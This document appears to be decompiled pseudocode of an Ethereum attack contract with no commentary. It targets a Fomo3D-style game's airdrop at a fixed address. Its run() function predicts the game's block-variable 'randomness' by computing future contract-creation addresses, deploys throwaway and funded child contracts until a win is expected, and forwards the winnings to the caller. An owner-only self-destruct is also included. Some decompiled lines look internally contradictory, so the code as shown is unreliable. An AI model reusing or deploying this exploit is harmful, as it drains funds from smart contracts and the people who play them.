contract main {




// =====================  Runtime code  =====================


uint256 stor0;

function kill() payable {
    require msg.sender == 0x6fae851378b9c1499d4fe9d01895c515365ed9dc
    selfdestruct(0x6fae851378b9c1499d4fe9d01895c515365ed9dc)
}

function _fallback() payable {
    revert
}

function run() payable {
    require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
    call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.airDropPot_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] >= 4 * 10^17:
        require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
        call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.airDropTracker_() with:
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        mem[128] = address(block.coinbase)
        mem[96] = 20
        mem[64] = 148
        mem[148 len 0] = None
        mem[148 len 20] = address(block.coinbase, 0)
        require block.timestamp
        idx = 0
        s = stor0
        t = 0
        while idx <= 10:
            require s <= test266151307()
            if 0 >= s:
                u = 1
                v = 0
                while s >= u:
                    u = 256 * u
                    v = v + 1
                    continue 
                if s <= 0:
                    _770 = mem[64]
                    mem[64] = mem[64] + 32
                    mem[_770] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                    _774 = mem[64]
                    mem[mem[64] + 32] = address(sha3(mem[_770 len v + 23]))
                    _775 = mem[64]
                    mem[mem[64]] = 20
                    mem[64] = mem[64] + 52
                    _777 = mem[_775]
                    v = _775 + 32
                    w = _774 + 52
                    u = mem[_775]
                    while u >= 32:
                        mem[w] = mem[v]
                        v = v + 32
                        w = w + 32
                        u = u - 32
                        continue 
                    mem[_774 + floor32(mem[_775]) + 52] = mem[_774 + floor32(mem[_775]) + 52] and 256^(-(mem[_775] % 32) + 32) - 1 or mem[_775 + floor32(mem[_775]) + 32] and !(256^(-(mem[_775] % 32) + 32) - 1)
                    require block.timestamp
                    mem[_774 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_774 + 52 len _777]) / block.timestamp)
                    mem[_774 + 52] = 32
                    mem[64] = _774 + 116
                    v = _774 + 84
                    w = _774 + 116
                    u = 32
                    while u >= 32:
                        mem[w] = mem[v]
                        v = v + 32
                        w = w + 32
                        u = u - 32
                        continue 
                    if sha3(mem[_774 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                        idx = idx + 1
                        s = s + 1
                        t = t + 1
                        continue 
                else:
                    if s >= 128:
                        _778 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_778] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _790 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_778 len v + 23]))
                        _791 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _793 = mem[_791]
                        s = _791 + 32
                        v = _790 + 52
                        u = mem[_791]
                        while u >= 32:
                            mem[v] = mem[s]
                            s = s + 32
                            v = v + 32
                            u = u - 32
                            continue 
                        mem[_790 + floor32(mem[_791]) + 52] = mem[_790 + floor32(mem[_791]) + 52] and 256^(-(mem[_791] % 32) + 32) - 1 or mem[_791 + floor32(mem[_791]) + 32] and !(256^(-(mem[_791] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_790 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_790 + 52 len _793]) / block.timestamp)
                        mem[_790 + 52] = 32
                        mem[64] = _790 + 116
                        v = _790 + 84
                        w = _790 + 116
                        idx = 32
                        while idx >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            idx = idx - 32
                            continue 
                        if sha3(mem[_790 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                            s = s + 1
                            u = u + 1
                            t = t + 1
                            continue 
                    else:
                        _780 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_780] = (address(this.address) << 80) + (v + 214 << 248) + (s << 72) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _794 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_780 len v + 23]))
                        _795 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _797 = mem[_795]
                        s = _795 + 32
                        v = _794 + 52
                        u = mem[_795]
                        while u >= 32:
                            mem[v] = mem[s]
                            s = s + 32
                            v = v + 32
                            u = u - 32
                            continue 
                        mem[_794 + floor32(mem[_795]) + 52] = mem[_794 + floor32(mem[_795]) + 52] and 256^(-(mem[_795] % 32) + 32) - 1 or mem[_795 + floor32(mem[_795]) + 32] and !(256^(-(mem[_795] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_794 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_794 + 52 len _797]) / block.timestamp)
                        mem[_794 + 52] = 32
                        mem[64] = _794 + 116
                        v = _794 + 84
                        w = _794 + 116
                        idx = 32
                        while idx >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            idx = idx - 32
                            continue 
                        if sha3(mem[_794 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                            s = s + 1
                            u = u + 1
                            t = t + 1
                            continue 
            else:
                if s < 128:
                    if s <= 0:
                        _494 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_494] = (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000
                        _496 = mem[64]
                        mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72))
                        _497 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _499 = mem[_497]
                        v = _497 + 32
                        w = _496 + 52
                        u = mem[_497]
                        while u >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            u = u - 32
                            continue 
                        mem[_496 + floor32(mem[_497]) + 52] = mem[_496 + floor32(mem[_497]) + 52] and 256^(-(mem[_497] % 32) + 32) - 1 or mem[_497 + floor32(mem[_497]) + 32] and !(256^(-(mem[_497] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_496 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_496 + 52 len _499]) / block.timestamp)
                        mem[_496 + 52] = 32
                        mem[64] = _496 + 116
                        v = _496 + 84
                        w = _496 + 116
                        u = 32
                        while u >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            u = u - 32
                            continue 
                        if sha3(mem[_496 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                            idx = idx + 1
                            s = s + 1
                            t = t + 1
                            continue 
                    else:
                        if s >= 128:
                            _500 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_500] = (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000
                            _504 = mem[64]
                            mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72))
                            _505 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _507 = mem[_505]
                            v = _505 + 32
                            w = _504 + 52
                            u = mem[_505]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_504 + floor32(mem[_505]) + 52] = mem[_504 + floor32(mem[_505]) + 52] and 256^(-(mem[_505] % 32) + 32) - 1 or mem[_505 + floor32(mem[_505]) + 32] and !(256^(-(mem[_505] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_504 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_504 + 52 len _507]) / block.timestamp)
                            mem[_504 + 52] = 32
                            mem[64] = _504 + 116
                            s = _504 + 84
                            v = _504 + 116
                            u = 32
                            while u >= 32:
                                mem[v] = mem[s]
                                s = s + 32
                                v = v + 32
                                u = u - 32
                                continue 
                            if sha3(mem[_504 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                                s = _504 + 117
                                u = 1
                                t = t + 1
                                continue 
                        else:
                            _502 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_502] = (address(this.address) << 80) + (s << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000
                            _508 = mem[64]
                            mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (s << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000) >> 72))
                            _509 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _511 = mem[_509]
                            v = _509 + 32
                            w = _508 + 52
                            u = mem[_509]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_508 + floor32(mem[_509]) + 52] = mem[_508 + floor32(mem[_509]) + 52] and 256^(-(mem[_509] % 32) + 32) - 1 or mem[_509 + floor32(mem[_509]) + 32] and !(256^(-(mem[_509] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_508 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_508 + 52 len _511]) / block.timestamp)
                            mem[_508 + 52] = 32
                            mem[64] = _508 + 116
                            s = _508 + 84
                            v = _508 + 116
                            u = 32
                            while u >= 32:
                                mem[v] = mem[s]
                                s = s + 32
                                v = v + 32
                                u = u - 32
                                continue 
                            if sha3(mem[_508 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                                s = _508 + 117
                                u = 1
                                t = t + 1
                                continue 
                else:
                    u = 1
                    v = 0
                    while s >= u:
                        u = 256 * u
                        v = v + 1
                        continue 
                    if s <= 0:
                        _772 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_772] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _782 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_772 len v + 23]))
                        _783 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _785 = mem[_783]
                        s = _783 + 32
                        v = _782 + 52
                        u = mem[_783]
                        while u >= 32:
                            mem[v] = mem[s]
                            s = s + 32
                            v = v + 32
                            u = u - 32
                            continue 
                        mem[_782 + floor32(mem[_783]) + 52] = mem[_782 + floor32(mem[_783]) + 52] and 256^(-(mem[_783] % 32) + 32) - 1 or mem[_783 + floor32(mem[_783]) + 32] and !(256^(-(mem[_783] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_782 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_782 + 52 len _785]) / block.timestamp)
                        mem[_782 + 52] = 32
                        mem[64] = _782 + 116
                        v = _782 + 84
                        w = _782 + 116
                        idx = 32
                        while idx >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            idx = idx - 32
                            continue 
                        if sha3(mem[_782 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                            s = s + 1
                            u = u + 1
                            t = t + 1
                            continue 
                    else:
                        if s >= 128:
                            _786 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_786] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                            _798 = mem[64]
                            mem[mem[64] + 32] = address(sha3(mem[_786 len v + 23]))
                            _799 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _801 = mem[_799]
                            v = _799 + 32
                            w = _798 + 52
                            u = mem[_799]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_798 + floor32(mem[_799]) + 52] = mem[_798 + floor32(mem[_799]) + 52] and 256^(-(mem[_799] % 32) + 32) - 1 or mem[_799 + floor32(mem[_799]) + 32] and !(256^(-(mem[_799] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_798 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_798 + 52 len _801]) / block.timestamp)
                            mem[_798 + 52] = 32
                            mem[64] = _798 + 116
                            v = _798 + 84
                            w = _798 + 116
                            u = 32
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            if sha3(mem[_798 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                                idx = idx + 1
                                s = s + 1
                                t = t + 1
                                continue 
                        else:
                            _788 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_788] = (address(this.address) << 80) + (v + 214 << 248) + (s << 72) + 0x94000000000000000000000000000000000000000000000000000000000000
                            _802 = mem[64]
                            mem[mem[64] + 32] = address(sha3(mem[_788 len v + 23]))
                            _803 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _805 = mem[_803]
                            v = _803 + 32
                            w = _802 + 52
                            u = mem[_803]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_802 + floor32(mem[_803]) + 52] = mem[_802 + floor32(mem[_803]) + 52] and 256^(-(mem[_803] % 32) + 32) - 1 or mem[_803 + floor32(mem[_803]) + 32] and !(256^(-(mem[_803] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_802 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_802 + 52 len _805]) / block.timestamp)
                            mem[_802 + 52] = 32
                            mem[64] = _802 + 116
                            v = _802 + 84
                            w = _802 + 116
                            u = 32
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            if sha3(mem[_802 + 116]) % 1000 >= ext_call.return_data[0] + 1:
                                idx = idx + 1
                                s = s + 1
                                t = t + 1
                                continue 
            s = 0
            while s < t:
                create contract with 0 wei
                                code: 13311
                s = s + 1
                continue 
            create contract with 100000000000000000 wei
                            code: code.data[1645 len 269], 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c
            if not create.new_address:
                revert with ext_call.return_data[0 len return_data.size]
            require eth.balance(this.address) < eth.balance(this.address)
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor0 = t + stor0 + 1
            return 1
        return 0
    else:
        return 0
}



}
